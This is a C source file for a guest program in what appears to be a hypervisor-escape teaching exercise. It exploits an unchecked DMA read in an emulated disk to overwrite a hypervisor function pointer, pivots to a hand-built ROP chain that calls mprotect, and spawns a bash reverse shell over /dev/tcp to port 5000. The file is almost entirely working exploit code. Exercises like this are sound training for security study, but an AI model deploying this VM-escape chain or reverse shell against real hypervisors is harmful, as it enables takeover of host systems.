extern void outb(unsigned short a, unsigned char b);
extern void outl(unsigned short a, unsigned int b);

// 0000000000001051 address of reverse shell inside guest mem
// 0000000001407000 B foo_ptr
// 0000000000407000 B guestmem


void print(const char *s)
{
	while (*s != '\0') {
		outb(0x60, *s);
		s++;
	}
}

unsigned long const libc = 0x00007ffff7bbc000;
unsigned long const system = libc + 0x000000000055410; // address of system in libc
typedef int (*system_p)(const char *);
void revshell()
{

	system_p sys = (system_p)system;
	(*sys)("/bin/bash -c 'bash >& /dev/tcp/localhost/5000 <&1 &'");
}

/************************************************************************************************
 * 
 * 							  VULN & ATTACK PLAN
 * 
 *  The virtual machine can make use of an emulated hard disk. The HDD is 
 * 	capable of "DMA" operations. In the operation of DMA read, no control is put in
 * 	place in the address of the guestmem: the operation always copy 512 bytes
 * 	and there is the possibility to overwrite something beyond the guest memory, 
 * 	overwriting hypervisor's variables. In this example, foo pointer represents 
 * 	sensible pointers inside QEMU for instance. We can try to overwrite that pointer 
 * 	in order to let the hypervisor connect to another machine controlled by us, 
 * 	using a reverse shell. In this first variant of the exercise the hypervisor set the 
 * 	pages containing the guest memory as executable using mprotect(), just to make the
 * 	attack easier for learning purposes. We then increment the difficulty step by step.
 * 
 * 
************************************************************************************************/

char payload[512];
char fake_stack[256];
char *copyback_buffer;


void prepare_fake_stack(unsigned long rev_shell_guest, unsigned long guestmem_host, unsigned long xchng_gadget){ // call mprotect and then jump to revshell again
	unsigned long *p = (unsigned long *) fake_stack;
	*(p) = 	   libc + 0x0000000000026b72; // 0x0000000000026b72: pop rdi; ret;
	*(p + 1) = 0x0000000000407000;
	*(p + 2) = libc + 0x0000000000027529; // 0x0000000000027529: pop rsi; ret;
	*(p + 3) = 0x0000000001000000;
	*(p + 4) = libc + 0x000000000011c371; // 0x000000000011c371: pop rdx; pop r12; ret;
	*(p + 5) = 0x0000000000000007;
	*(p + 6) = 0xdeadbeefdeadbeef;
	*(p + 7) = libc + 0x000000000004a550; // 0x000000000004a550: pop rax; ret;
	*(p + 8) = 0x000000000000000a;
	*(p + 9) = libc + 0x0000000000066229; // 0x0000000000066229: syscall; ret;
	// *(p + 10) = libc + 0x00000000000284c8; // 0x00000000000284c8: call rsp;
	*(p + 10) = libc + 0x0000000000026b72; // 0x0000000000026b72: pop rdi; ret;
	*(p + 11) = 0xdeadbeefdeadbeef;
	*(p + 12) = guestmem_host + rev_shell_guest;
	*(p + 13) = xchng_gadget;
	return;
}

int main()
{
	unsigned long const KiB = 1024UL;
	unsigned long const MiB = 1024*KiB;
	unsigned long const GUESTMEMSZ = 16*MiB;
	unsigned long rev_shell_guest = 0x000000000001051;
	unsigned long foo_ptr_host 	= 	0x1407000;
	unsigned long guestmem_host = 	0x0407000;
	unsigned long stack_pivot_gadget = libc + 0x00000000000334ea; //: xchg eax, esp; ret;

	/* We want to build the payload in guest mem, then copy it to disk, 
	and then copy it back to guest mem, overwriting foo_ptr.
	In the hypervisor, foo_ptr is right after the the space reserved
	to the guest memory. Since we have to overwrite just 8 bytes and
	the DMA read will copy 512 bytes, the address inside the guest where
	we ask to copy data is: GUESTMEMSZ - 512 + 8. */
	
	copyback_buffer = (char *)GUESTMEMSZ - 512 + 8;

	char *p = payload;
	for(int i = 0; i < 512 - 8; i++)
		*(p + i) = 'A';
	
	*(unsigned long *)(p + 512 - 8) = (unsigned long)(stack_pivot_gadget);

	/* Now we also have to prepare the fake stack containing the rop chain that
	calls mprotect to guest mem and let us execute the reverse shell.
	We can use ropper to build it. */
	prepare_fake_stack(guestmem_host, rev_shell_guest, stack_pivot_gadget);

/*
	HDD interface
	unsigned int snr;	// 0x40, sector number
	unsigned int mem;	// 0x44, guest memory address
	unsigned int cmd;	// 0x48, 1: DMA-in, 2: DMA-out
*/

	// write payload
	outl(0x40, 50); 
	outl(0x44, (unsigned int) payload);
	outl(0x48, 2);

	// copy back, overwriting foo pointer with stack pivot gadget
	outl(0x40, 50);
	outl(0x44, (unsigned int) copyback_buffer);
	outl(0x48, 1);

	// trigger foo_pointer call, jumping to stack pivot and xchng stack to our prepared one
	outl(0x70, (unsigned int) fake_stack);

}
